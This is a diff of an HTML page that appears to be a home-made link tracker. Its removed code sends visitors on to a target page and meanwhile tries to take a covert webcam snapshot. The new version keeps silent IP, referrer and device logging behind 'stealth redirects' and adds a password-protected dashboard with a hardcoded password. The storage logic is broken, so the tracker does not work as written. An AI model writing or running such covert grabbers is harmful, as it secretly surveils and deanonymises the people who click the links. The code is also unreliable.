@@ -1,34 +1,426 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>URL Tracker</title>
+    <style>
+        :root {
+            --primary: #3b82f6;
+            --primary-dark: #2563eb;
+            --danger: #ef4444;
+            --success: #10b981;
+            --gray: #6b7280;
+            --light-gray: #f3f4f6;
+            --dark: #111827;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f9fafb;
+            color: var(--dark);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Login Page */
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .login-box {
+            background: white;
+            padding: 2rem;
+            border-radius: 0.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .login-title {
+            text-align: center;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+        }
+        
+        .login-input {
+            width: 100%;
+            padding: 0.75rem;
+            margin-bottom: 1rem;
+            border: 1px solid #d1d5db;
+            border-radius: 0.375rem;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 0.75rem;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background-color 0.2s;
+        }
+        
+        .login-btn:hover {
+            background-color: var(--primary-dark);
+        }
+        
+        /* Admin Dashboard */
+        .dashboard {
+            display: none;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .url-generator {
+            background-color: white;
+            padding: 1.5rem;
+            border-radius: 0.5rem;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            margin-bottom: 1.5rem;
+        }
+        
+        .input-group {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        .input-group input {
+            flex: 1;
+            padding: 0.75rem;
+            border: 1px solid #d1d5db;
+            border-radius: 0.375rem;
+        }
+        
+        .btn {
+            padding: 0.75rem 1.5rem;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        
+        .btn:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-1px);
+        }
+        
+        .btn-danger {
+            background-color: var(--danger);
+        }
+        
+        .btn-success {
+            background-color: var(--success);
+        }
+        
+        .controls {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background-color: white;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            border-radius: 0.5rem;
+            overflow: hidden;
+        }
+        
+        th, td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        
+        th {
+            background-color: var(--light-gray);
+            font-weight: 600;
+        }
+        
+        tr:hover {
+            background-color: #f9fafb;
+        }
+        
+        /* Tracking Page (hidden) */
+        .tracker {
+            display: none;
+        }
+        
+        /* Modal */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 0.5rem;
+            max-width: 90%;
+            max-height: 90%;
+            overflow: auto;
+            position: relative;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--gray);
+        }
+        
+        .camera-image {
+            max-width: 100%;
+            max-height: 80vh;
+            border-radius: 0.25rem;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Page -->
+    <div class="login-container" id="login-page">
+        <div class="login-box">
+            <h1 class="login-title">URL Tracker Login</h1>
+            <input type="password" id="password" class="login-input" placeholder="Enter password">
+            <button class="login-btn" onclick="checkLogin()">Login</button>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard -->
+    <div class="container dashboard" id="dashboard">
+        <div class="header">
+            <h1>URL Tracker Dashboard</h1>
+            <p>Track clicks with stealth redirects</p>
+        </div>
+        
+        <div class="url-generator">
+            <h2>Generate Tracking URL</h2>
+            <div class="input-group">
+                <input type="text" id="target-url" placeholder="https://example.com">
+                <button class="btn" id="generate-btn">Generate</button>
+            </div>
+            <div id="result" style="margin-top: 1rem;"></div>
+        </div>
+        
+        <div class="controls">
+            <button class="btn" id="refresh-btn">Refresh Data</button>
+            <button class="btn btn-success" id="export-btn">Export CSV</button>
+            <button class="btn btn-danger" id="clear-btn">Clear Data</button>
+        </div>
+        
+        <table id="data-table">
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>IP</th>
+                    <th>Target URL</th>
+                    <th>Referrer</th>
+                    <th>Device</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
+
+    <!-- Tracking Page (hidden) -->
+    <div class="tracker" id="tracker"></div>
+
     <script>
-    // Immediately start processing on page load
-    (function() {
+    // Configuration
+    const ADMIN_PASSWORD = "admin123"; // Change this to your password
+    const TRACKING_PREFIX = window.location.origin + "/?track=";
+    
+    // State management
+    let isAdmin = false;
+    
+    // Check login
+    function checkLogin() {
+        const password = document.getElementById('password').value;
+        if (password === ADMIN_PASSWORD) {
+            isAdmin = true;
+            document.getElementById('login-page').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            loadTrackingData();
+        } else {
+            alert('Incorrect password');
+        }
+    }
+    
+    // Load tracking data
+    function loadTrackingData() {
+        const data = getTrackingData();
+        const tbody = document.querySelector('#data-table tbody');
+        
+        tbody.innerHTML = data.map(item => `
+            <tr>
+                <td>${formatDate(item.timestamp)}</td>
+                <td>${item.ip || 'Unknown'}</td>
+                <td><a href="${item.target}" target="_blank">${shortenUrl(item.target)}</a></td>
+                <td>${shortenReferrer(item.referrer)}</td>
+                <td>${getDeviceType(item.userAgent)}</td>
+            </tr>
+        `).join('');
+    }
+    
+    // Generate tracking URL
+    document.getElementById('generate-btn').addEventListener('click', function() {
+        const targetUrl = document.getElementById('target-url').value.trim();
+        if (!targetUrl) return alert('Please enter a URL');
+        
+        try {
+            new URL(targetUrl);
+        } catch {
+            return alert('Invalid URL format');
+        }
+        
+        const trackingId = generateId();
+        const trackingUrl = TRACKING_PREFIX + trackingId + "&target=" + encodeURIComponent(targetUrl);
+        
+        document.getElementById('result').innerHTML = `
+            <div style="background: #f3f4f6; padding: 1rem; border-radius: 0.375rem;">
+                <p style="margin-bottom: 0.5rem; font-weight: 500;">Tracking URL:</p>
+                <input type="text" value="${trackingUrl}" style="width: 100%; padding: 0.75rem; border: 1px solid #d1d5db; border-radius: 0.375rem; margin-bottom: 0.5rem;" readonly>
+                <button class="btn" onclick="copyToClipboard()">Copy URL</button>
+            </div>
+        `;
+    });
+    
+    // Helper functions
+    function copyToClipboard() {
+        const input = document.querySelector('#result input');
+        input.select();
+        document.execCommand('copy');
+        alert('URL copied to clipboard!');
+    }
+    
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+    
+    function shortenUrl(url) {
+        try {
+            const u = new URL(url);
+            return u.hostname.replace('www.', '');
+        } catch {
+            return url.length > 30 ? url.substring(0, 30) + '...' : url;
+        }
+    }
+    
+    function shortenReferrer(ref) {
+        if (ref === 'Direct') return ref;
+        try {
+            const u = new URL(ref);
+            return u.hostname.replace('www.', '');
+        } catch {
+            return ref.length > 20 ? ref.substring(0, 20) + '...' : ref;
+        }
+    }
+    
+    function getDeviceType(ua) {
+        if (/mobile/i.test(ua)) return '📱 Mobile';
+        if (/tablet/i.test(ua)) return '🖥 Tablet';
+        return '💻 Desktop';
+    }
+    
+    function generateId() {
+        return 'trk_' + Math.random().toString(36).substr(2, 8);
+    }
+    
+    function getTrackingData() {
+        return JSON.parse(localStorage.getItem('tracking_data') || []);
+    }
+    
+    function saveTrackingData(data) {
+        localStorage.setItem('tracking_data', JSON.stringify(data));
+    }
+    
+    // Control buttons
+    document.getElementById('refresh-btn').addEventListener('click', loadTrackingData);
+    
+    document.getElementById('export-btn').addEventListener('click', function() {
+        const data = getTrackingData();
+        let csv = 'Timestamp,IP Address,Target URL,Referrer,Device\n';
+        
+        data.forEach(item => {
+            csv += `"${formatDate(item.timestamp)}","${item.ip || 'Unknown'}","${item.target}","${item.referrer}","${getDeviceType(item.userAgent)}"\n`;
+        });
+        
+        const blob = new Blob([csv], { type: 'text/csv' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `tracking-data-${new Date().toISOString().split('T')[0]}.csv`;
+        a.click();
+    });
+    
+    document.getElementById('clear-btn').addEventListener('click', function() {
+        if (confirm('Delete ALL tracking data? This cannot be undone.')) {
+            localStorage.removeItem('tracking_data');
+            loadTrackingData();
+        }
+    });
+    
+    // Tracking functionality
+    function processTracking() {
         const params = new URLSearchParams(window.location.search);
         const trackingId = params.get('track');
         const targetUrl = params.get('target');
         
         if (trackingId && targetUrl) {
-            // Decode target URL first
             const decodedUrl = decodeURIComponent(targetUrl);
             
-            // Prepare minimal tracking data
+            // Prepare tracking data
             const trackingData = {
                 id: trackingId,
                 timestamp: new Date().toISOString(),
                 target: decodedUrl,
                 referrer: document.referrer || 'Direct',
                 userAgent: navigator.userAgent,
-                ip: 'Pending',
-                image: null
+                ip: 'Pending'
             };
-
-            // Start immediate redirect
+            
+            // Immediate redirect
             window.location.href = decodedUrl;
             
-            // Continue processing in background (after redirect)
+            // Get IP in background
             setTimeout(async () => {
-                // Try to get IP
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     trackingData.ip = (await ipResponse.json()).ip;
@@ -36,43 +428,21 @@
                     trackingData.ip = 'Unknown';
                 }
                 
-                // Try camera capture if available
-                if (navigator.mediaDevices) {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ 
-                            video: { facingMode: 'user' },
-                            audio: false 
-                        });
-                        
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        await video.play();
-                        
-                        // Quick capture (reduced from 3s to 500ms)
-                        await new Promise(r => setTimeout(r, 500));
-                        
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        trackingData.image = canvas.toDataURL('image/jpeg', 0.7);
-                        stream.getTracks().forEach(t => t.stop());
-                    } catch (e) {
-                        console.log('Camera capture skipped:', e);
-                    }
-                }
-                
                 // Save data
-                const allData = JSON.parse(localStorage.getItem('track_data') || []);
+                const allData = getTrackingData();
                 allData.unshift(trackingData);
-                localStorage.setItem('track_data', JSON.stringify(allData));
+                saveTrackingData(allData);
             }, 0);
         }
-    })();
+    }
+    
+    // Auto-detect if this is a tracking request
+    if (window.location.search.includes('track=') && !isAdmin) {
+        processTracking();
+    }
+    
+    // Focus password field on load
+    document.getElementById('password')?.focus();
     </script>
-</head>
-<body>
-    <!-- Empty page - redirect happens before anything renders -->
 </body>
 </html>
